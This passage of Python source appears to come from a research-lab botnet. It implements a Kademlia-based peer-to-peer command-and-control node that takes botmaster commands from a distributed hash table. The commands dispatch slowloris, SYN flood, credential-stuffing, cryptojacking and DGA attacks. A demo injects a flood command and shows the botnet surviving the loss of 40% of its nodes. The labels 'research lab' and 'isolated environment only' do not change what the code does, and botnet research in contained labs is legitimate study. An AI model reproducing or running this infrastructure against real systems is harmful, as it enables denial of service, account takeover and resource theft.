        elif ct=="slowloris":
            self._launch("slowloris",_attack_slowloris,cmd.get("target","192.168.100.20"),
                         int(cmd.get("port",80)),int(cmd.get("duration",60)))
        elif ct=="cryptojack":
            self._launch("cryptojack",_attack_cryptojack,int(cmd.get("duration",120)),
                         float(cmd.get("cpu",0.25)))
        elif ct=="cred_stuffing":
            self._launch("cred_stuffing",_attack_cred_stuffing,
                         cmd.get("target","192.168.100.20"),int(cmd.get("port",80)),
                         int(cmd.get("duration",120)),cmd.get("mode","jitter"),
                         int(cmd.get("jitter",200)),int(cmd.get("workers",3)))
        elif ct=="stop_all":   self._stop_all_attacks()
        elif ct=="shutdown":   self._stop_all_attacks(); self._running=False
        elif ct=="idle":       print("[P2P] -> Idle")
        elif ct=="dga_search": self._launch("dga_search",_attack_dga_search)
        elif ct=="update_secret":
            global _KEY_HASH
            new_secret = cmd.get("secret","")
            if len(new_secret)>=8:
                with _KEY_HASH_LOCK: _KEY_HASH=hashlib.sha256(new_secret.encode()).digest()
                print(f"[P2P] -> P2P mesh key rotated. New keystream: {_KEY_HASH[:4].hex()}...")
            else:
                print("[P2P] -> update_secret ignored: secret must be >=8 chars")
        else:
            print(f"[P2P] -> Unknown command type: {ct}")

    # maintenance threads

    def _refresh_loop(self):
        while self._running:
            time.sleep(REFRESH_INTERVAL)
            if not self._running: break
            stale = self.routing.stale_buckets()
            if not stale: continue
            print(f"[P2P] Refreshing {len(stale)} stale bucket(s)...")
            for _idx,bucket in stale:
                if not self._running: break
                self.iterative_find_node(NodeID.random())
                bucket.touch()
            print(f"[P2P] Bucket refresh done. {len(self.routing.all_contacts())} peers.")

    def _command_poll_loop(self):
        while self._running:
            time.sleep(POLL_INTERVAL+random.randint(-5,5))
            if self._running: self._poll_for_commands()

    def _replicate_loop(self):
        while self._running:
            time.sleep(REPLICATE_INTERVAL)
            if not self._running: break
            print("[P2P] Replicating locally stored values...")
            now = time.time()
            with self.store_lock:
                snapshot = {k:v for k,v in self.store.items()
                            if (now-v["ts"])<v.get("ttl",VALUE_TTL)}
            replicated = 0
            for key,entry in snapshot.items():
                try:
                    tid     = NodeID(int(hashlib.sha1(key.encode()).hexdigest(),16))
                    closest = self.iterative_find_node(tid)
                    acks    = sum(1 for c in closest[:K] if self._store_rpc(c,key,entry["value"]))
                    replicated+=1
                except Exception: pass
            print(f"[P2P] Replication done. {replicated} key(s) replicated.")

    def _republish_loop(self):
        """Original-publisher republishing — paper §2.5."""
        while self._running:
            time.sleep(REPUBLISH_INTERVAL)
            if not self._running: break
            with self._orig_keys_lock: keys = set(self._orig_keys)
            if not keys: continue
            print(f"[P2P] Republishing {len(keys)} original key(s)...")
            republished = 0
            for key in keys:
                with self.store_lock: entry = self.store.get(key)
                if not entry: continue
                try:
                    tid     = NodeID(int(hashlib.sha1(key.encode()).hexdigest(),16))
                    closest = self.iterative_find_node(tid)
                    for c in closest[:K]: self._store_rpc(c,key,entry["value"])
                    with self.store_lock:
                        if key in self.store:
                            self.store[key]["ts"]  = time.time()
                            self.store[key]["ttl"] = VALUE_TTL
                    republished+=1
                except Exception: pass
            print(f"[P2P] Republished {republished} key(s).")

    def _expiry_loop(self):
        """Background KV store TTL expiry sweep."""
        while self._running:
            time.sleep(EXPIRY_CHECK_SEC)
            if not self._running: break
            now = time.time()
            with self.store_lock:
                expired = [k for k,v in self.store.items()
                           if (now-v["ts"])>=v.get("ttl",VALUE_TTL)]
                for k in expired: del self.store[k]
            if expired: print(f"[P2P] Expired {len(expired)} stale KV entries")

    def _periodic_bootstrap_loop(self):
        """Periodic re-bootstrap — libp2p spec §Bootstrap process."""
        while self._running:
            time.sleep(BOOTSTRAP_INTERVAL)
            if not self._running: break
            print("[P2P] Periodic bootstrap: running self-lookup...")
            self.iterative_find_node(self.node_id)
            print(f"[P2P] Periodic bootstrap done. {len(self.routing.all_contacts())} peers.")

    def _status_loop(self):
        while self._running:
            time.sleep(STATUS_INTERVAL)
            if not self._running: break
            contacts = self.routing.all_contacts()
            now      = time.time()
            with self.store_lock:
                n_live  = sum(1 for v in self.store.values() if (now-v["ts"])<v.get("ttl",VALUE_TTL))
                n_total = len(self.store)
            with self._active_lock: aa = list(self._active.keys())
            print(f"\n[P2P] -- Status @ {datetime.now().strftime('%H:%M:%S')} --")
            print(f"[P2P]  Mode     : {'server' if self.server_mode else 'client'}")
            print(f"[P2P]  Node ID  : {self.node_id.to_hex()[:16]}...")
            print(f"[P2P]  Peers    : {len(contacts)}")
            print(f"[P2P]  KV keys  : {n_live} live / {n_total} total")
            print(f"[P2P]  Attacks  : {aa or 'none'}")
            print(f"[P2P]  Cmds     : {self._exec_count} executed\n")

    # start / stop

    def start(self) -> list:
        self._bind(); self._running = True
        threads = [
            threading.Thread(target=self._recv_loop,              daemon=True,name="recv"),
            threading.Thread(target=self._refresh_loop,           daemon=True,name="refresh"),
            threading.Thread(target=self._command_poll_loop,      daemon=True,name="cmd_poll"),
            threading.Thread(target=self._replicate_loop,         daemon=True,name="replicate"),
            threading.Thread(target=self._status_loop,            daemon=True,name="status"),
            threading.Thread(target=self._periodic_bootstrap_loop,daemon=True,name="bootstrap"),
            threading.Thread(target=self._republish_loop,         daemon=True,name="republish"),
            threading.Thread(target=self._expiry_loop,            daemon=True,name="expiry"),
        ]
        for t in threads: t.start()
        self.bootstrap()
        return threads

    def stop(self):
        self._running = False; self._stop_all_attacks()
        if self._sock:
            try: self._sock.close()
            except Exception: pass

    def status(self) -> dict:
        contacts = self.routing.all_contacts()
        with self._active_lock: aa = list(self._active.keys())
        with self.store_lock: sk = list(self.store.keys())
        return {"node_id":self.node_id.to_hex(),"host":self.host,"port":self.port,
                "server_mode":self.server_mode,"peer_count":len(contacts),
                "store_keys":sk,"bucket_fill":self.routing.bucket_stats(),
                "active_attacks":aa,"cmds_executed":self._exec_count}

# resilience demo

def demonstrate_resilience(nodes: List[KademliaNode], kill_fraction: float = 0.4):
    n_kill    = int(len(nodes)*kill_fraction)
    victims   = random.sample(nodes,n_kill)
    survivors = [n for n in nodes if n not in victims]
    print(f"\n{'='*58}")
    print(f"[RESILIENCE] Killing {n_kill}/{len(nodes)} nodes ({kill_fraction*100:.0f}%)")
    for v in victims:
        v.stop()
        print(f"[RESILIENCE] Killed: {v.node_id.to_hex()[:12]}... @ {v.host}:{v.port}")
    time.sleep(2)
    if survivors:
        cmd  = {"type":"syn_flood","target":"192.168.100.20","port":80,"duration":5}
        acks = survivors[0].inject_command(cmd)
        found = sum(1 for s in survivors if s.iterative_find_value(KademliaNode.COMMAND_KEY) is not None)
        print(f"\n[RESILIENCE] {found}/{len(survivors)} survivors found the command")
        print(f"[RESILIENCE] Botnet operational despite {kill_fraction*100:.0f}% loss")
    print("="*58)

# entry point

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Kademlia P2P Node -- AUA Research Lab")
    p.add_argument("--host",      default="127.0.0.1")
    p.add_argument("--port",      type=int,default=7400)
    p.add_argument("--bootstrap", action="append",default=[],metavar="HOST:PORT")
    p.add_argument("--inject",    type=str,default=None,metavar="JSON")
    p.add_argument("--demo",      action="store_true")
    p.add_argument("--client",    action="store_true",
                   help="Client mode: queries DHT but not added to others' routing tables")
    args = p.parse_args()

    if args.demo:
        print("="*58)
        print(" Kademlia P2P Demo -- 5 local nodes (fully spec-compliant)")
        print(" AUA Botnet Research Lab")
        print(" (Wire-compatible with kademlia_p2p.c --demo)")
        print("="*58)
        BASE_PORT=7500; nodes_demo=[]
        for i in range(5):
            port  = BASE_PORT+i
            peers = [("127.0.0.1",BASE_PORT)] if i>0 else []
            nodes_demo.append(KademliaNode("127.0.0.1",port,bootstrap_peers=peers))
        for n in nodes_demo: n.start(); time.sleep(0.3)
        print("\n[DEMO] All nodes started. Stabilising routing tables...")
        time.sleep(3)
        print("\n[DEMO] Botmaster injecting command via node 0...")
        nodes_demo[0].inject_command({"type":"syn_flood","target":"192.168.100.20","port":80,"duration":5})
        time.sleep(2)
        print("\n[DEMO] All nodes polling DHT for command...")
        found_count = 0
        for n in nodes_demo:
            val = n.iterative_find_value(KademliaNode.COMMAND_KEY)
            tag = "FOUND" if val else "not found"
            print(f"  {n.node_id.to_hex()[:12]}... {tag}")
            if val: found_count+=1
        print(f"[DEMO] {found_count}/5 nodes found the command\n")
        demonstrate_resilience(nodes_demo,kill_fraction=0.4)
        print("\n[DEMO] Demo complete. Press Ctrl+C to exit.")
        try:
            while True: time.sleep(1)
        except KeyboardInterrupt:
            for n in nodes_demo: n.stop()
    else:
        print("="*58)
        print(f" Kademlia P2P Node -- AUA Botnet Research Lab")
        print(f" Node: {args.host}:{args.port}")
        print(" ISOLATED ENVIRONMENT ONLY")
        print("="*58)
        bootstrap_peers = []
        for bp in args.bootstrap:
            h,port_s = bp.rsplit(":",1); bootstrap_peers.append((h,int(port_s)))
        node = KademliaNode(args.host,args.port,bootstrap_peers=bootstrap_peers,
                            server_mode=not args.client)
        def _sigint(sig,frame):
            print("\n[P2P] SIGINT -- shutting down..."); node.stop(); sys.exit(0)
        signal.signal(signal.SIGINT,_sigint)
        node.start()
        if args.inject:
            time.sleep(2)
            cmd  = json.loads(args.inject)
            acks = node.inject_command(cmd)
            print(f"[P2P] Injected: {cmd.get('type')} | acks: {acks}")
            time.sleep(1); node.stop()
        else:
            print("\n[P2P] Running. Ctrl+C to stop.\n")
            while node._running: time.sleep(1)